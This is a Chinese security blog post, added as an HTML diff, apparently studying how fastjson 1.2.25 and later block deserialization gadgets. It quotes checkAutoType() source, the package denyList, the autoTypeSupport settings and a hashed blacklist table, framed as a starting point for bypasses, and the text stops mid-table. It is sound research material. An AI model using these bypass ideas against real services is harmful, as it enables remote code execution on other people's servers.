@@ -1,0 +1,2123 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pow1e">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1. 分析fastjson1.2.25的修复：checkAutoType()函数:首先看fastjson1.2.25如何修复1.2.24版本的漏洞的： 1.2.24版本的DefaultJSONParser#parseObject：  直接调用TypeUtils#loadClass直接加载类。 而再看1.2.25版本的DefaultJSONParser#parseObject：  如果当前key是@">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson 反序列化基础二(1.2.25-1.2.61)">
+<meta property="og:url" content="https://pow1e.github.io/2024/04/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201225-1261/index.html">
+<meta property="og:site_name" content="pow1e的知识小屋">
+<meta property="og:description" content="1. 分析fastjson1.2.25的修复：checkAutoType()函数:首先看fastjson1.2.25如何修复1.2.24版本的漏洞的： 1.2.24版本的DefaultJSONParser#parseObject：  直接调用TypeUtils#loadClass直接加载类。 而再看1.2.25版本的DefaultJSONParser#parseObject：  如果当前key是@">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240410170431936-1716861113343-69.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240410170325416-1716861113343-70.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240410170805351-1716861113343-71.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414104704129-1716861113343-72.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414111634704-1716861113343-73.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414111930869-1716861113343-74.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414112306195-1716861113343-76.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414112511025-1716861113343-75.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414112626851-1716861113344-77.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414113744202-1716861113344-78.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414114748746-1716861113344-79.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414114333371-1716861113344-80.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414125738167-1716861113344-81.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414130125103-1716861113344-82.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414130204347-1716861113344-83.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414131501913-1716861113344-84.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414132908235-1716861113344-85.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414133434822-1716861113344-86.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414134151168-1716861113344-87.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414134257756-1716861113344-88.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414134345989-1716861113344-90.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414134729534-1716861113344-89.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414141351614-1716861113344-91.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240414141138805-1716861113344-92.png">
+<meta property="article:published_time" content="2024-04-28T01:48:33.000Z">
+<meta property="article:modified_time" content="2024-05-28T02:08:39.474Z">
+<meta property="article:author" content="pow1e">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pow1e.github.io/blog_image/image-20240410170431936-1716861113343-69.png">
+  
+  
+  
+  <title>fastjson 反序列化基础二(1.2.25-1.2.61) - pow1e的知识小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pow1e.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pow1e的知识小屋</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fastjson 反序列化基础二(1.2.25-1.2.61)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-28 09:48" pubdate>
+          2024年4月28日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          232 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fastjson 反序列化基础二(1.2.25-1.2.61)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-分析fastjson1-2-25的修复："><a href="#1-分析fastjson1-2-25的修复：" class="headerlink" title="1. 分析fastjson1.2.25的修复："></a>1. 分析fastjson1.2.25的修复：</h1><h2 id="checkAutoType-函数"><a href="#checkAutoType-函数" class="headerlink" title="checkAutoType()函数:"></a>checkAutoType()函数:</h2><p>首先看fastjson1.2.25如何修复1.2.24版本的漏洞的：</p>
+<p><code>1.2.24</code>版本的<code>DefaultJSONParser#parseObject</code>：</p>
+<p><img src="/../../../blog_image/image-20240410170431936-1716861113343-69.png" srcset="/img/loading.gif" lazyload alt="image-20240410170431936"></p>
+<p>直接调用<code>TypeUtils#loadClass</code>直接加载类。</p>
+<p>而再看<code>1.2.25</code>版本的<code>DefaultJSONParser#parseObject</code>：</p>
+<p><img src="/../../../blog_image/image-20240410170325416-1716861113343-70.png" srcset="/img/loading.gif" lazyload alt="image-20240410170325416"></p>
+<p>如果当前key是<code>@type</code>就会调用<code>config#checkAutoType</code>。</p>
+<p><code>checkAutoType</code>的逻辑是判断<code>autoTypeSupport</code>是否开启并且检擦白名单：</p>
+<p><img src="/../../../blog_image/image-20240410170805351-1716861113343-71.png" srcset="/img/loading.gif" lazyload alt="image-20240410170805351"></p>
+<p>autoTypeSupport是默认不开启的，即先进行黑名单过滤，然后遍历<code>denyList</code>，然后在进行白名单过滤，若白名单匹配上则直接加载该类，否则报错。</p>
+<p>当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</p>
+<p>看大佬的注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br> <br>    <span class="hljs-comment">// autoTypeSupport默认为False</span><br>    <span class="hljs-comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">accept</span> <span class="hljs-operator">=</span> acceptList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">deny</span> <span class="hljs-operator">=</span> denyList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span><br>    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        clazz = deserializers.findClass(typeName);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br> <br>    <span class="hljs-comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">deny</span> <span class="hljs-operator">=</span> denyList[i];<br>            <span class="hljs-comment">// 从denyList中获取元素后 匹配头部</span><br>            <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">accept</span> <span class="hljs-operator">=</span> acceptList[i];<br>            <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br> <br>                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br> <br>        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="hljs-comment">// classloader is danger</span><br>            || DataSource.class.isAssignableFrom(clazz) <span class="hljs-comment">// dataSource can load jdbc driver</span><br>           ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br> <br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><code>denyList</code>黑名单列表如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bsh<br>com<span class="hljs-selector-class">.mchange</span><br>com<span class="hljs-selector-class">.sun</span>.<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span><br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.Socket</span><br>java<span class="hljs-selector-class">.rmi</span><br>javax<span class="hljs-selector-class">.xml</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.Transformer</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.fileupload</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.myfaces</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.servlet</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.wicket</span><span class="hljs-selector-class">.util</span><br>org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.runtime</span><br>org<span class="hljs-selector-class">.hibernate</span><br>org<span class="hljs-selector-class">.jboss</span><br>org<span class="hljs-selector-class">.mozilla</span><span class="hljs-selector-class">.javascript</span><br>org<span class="hljs-selector-class">.python</span><span class="hljs-selector-class">.core</span><br>org.springframework<br></code></pre></td></tr></table></figure>
+
+<p>以这些开头的类，大部分的利用链都不能使用了。</p>
+<h2 id="autoTypeSupport参数："><a href="#autoTypeSupport参数：" class="headerlink" title="autoTypeSupport参数："></a>autoTypeSupport参数：</h2><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。简单来说是就是启动autotype，这样就可以进行白名单校验，然后尝试bypass了。</p>
+<p>默认情况下<code>autoTypeSupport</code>为False，将其设置为True有两种方法：</p>
+<ul>
+<li><p>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></p>
+</li>
+<li><p>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></p>
+</li>
+</ul>
+<p>AutoType白名单设置方法：</p>
+<ol>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
+</ol>
+<p><img src="/../../../blog_image/image-20240414104704129-1716861113343-72.png" srcset="/img/loading.gif" lazyload alt="image-20240414104704129"></p>
+<ol start="3">
+<li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
+</ol>
+<p>小结：</p>
+<p>在1.2.24版本后，使用<code>checkAutoType</code>函数，通过白名单以及黑名单过滤的方式去防御fastjson反序列化，因此我们可以尝试对白名单和黑名单进行bypass，而网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。（师傅原话）</p>
+<h1 id="2-寻找利用链："><a href="#2-寻找利用链：" class="headerlink" title="2. 寻找利用链："></a>2. 寻找利用链：</h1><h2 id="fastjson黑白名单："><a href="#fastjson黑白名单：" class="headerlink" title="fastjson黑白名单："></a>fastjson黑白名单：</h2><p>我们可以从修复的角度来看，对于存在的黑名单，我们就不能利用了，我们可以寻找还没有被黑名单过滤的利用链。</p>
+<p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>目前已知的黑名单列表如下：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.42</td>
+<td>-8720046426850100497</td>
+<td>0x86fc2bf9beaf7aefL</td>
+<td>org.apache.commons.collections4.comparators</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-8109300701639721088</td>
+<td>0x8f75f9fa0df03f80L</td>
+<td>org.python.core</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7966123100503199569</td>
+<td>0x9172a53f157930afL</td>
+<td>org.apache.tomcat</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7766605818834748097</td>
+<td>0x9437792831df7d3fL</td>
+<td>org.apache.xalan</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-6835437086156813536</td>
+<td>0xa123a62f93178b20L</td>
+<td>javax.xml</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4837536971810737970</td>
+<td>0xbcdd9dc12766f0ceL</td>
+<td>org.springframework.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4082057040235125754</td>
+<td>0xc7599ebfe3e72406L</td>
+<td>org.apache.commons.beanutils</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-2364987994247679115</td>
+<td>0xdf2ddff310cdb375L</td>
+<td>org.apache.commons.collections.Transformer</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-1872417015366588117</td>
+<td>0xe603d6a51fad692bL</td>
+<td>org.codehaus.groovy.runtime</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-254670111376247151</td>
+<td>0xfc773ae20c827691L</td>
+<td>java.lang.Thread</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-190281065685395680</td>
+<td>0xfd5bfc610056d720L</td>
+<td>javax.net.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>313864100207897507</td>
+<td>0x45b11bc78a3aba3L</td>
+<td>com.mchange</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1203232727967308606</td>
+<td>0x10b2bdca849d9b3eL</td>
+<td>org.apache.wicket.util</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1502845958873959152</td>
+<td>0x14db2e6fead04af0L</td>
+<td>java.util.jar.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3547627781654598988</td>
+<td>0x313bb4abd8d4554cL</td>
+<td>org.mozilla.javascript</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3730752432285826863</td>
+<td>0x33c64b921f523f2fL</td>
+<td>java.rmi</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3794316665763266033</td>
+<td>0x34a81ee78429fdf1L</td>
+<td>java.util.prefs.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>4147696707147271408</td>
+<td>0x398f942e01920cf0L</td>
+<td>com.sun.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5347909877633654828</td>
+<td>0x4a3797b30328202cL</td>
+<td>java.util.logging.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5450448828334921485</td>
+<td>0x4ba3e254e758d70dL</td>
+<td>org.apache.bcel</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5751393439502795295</td>
+<td>0x4fd10ddc6d13821fL</td>
+<td>java.net.Socket</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5944107969236155580</td>
+<td>0x527db6b46ce3bcbcL</td>
+<td>org.apache.commons.fileupload</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>6742705432718011780</td>
+<td>0x5d92e6ddde40ed84L</td>
+<td>org.jboss</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7179336928365889465</td>
+<td>0x63a220e60a17c7b9L</td>
+<td>org.hibernate</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7442624256860549330</td>
+<td>0x6749835432e0f0d2L</td>
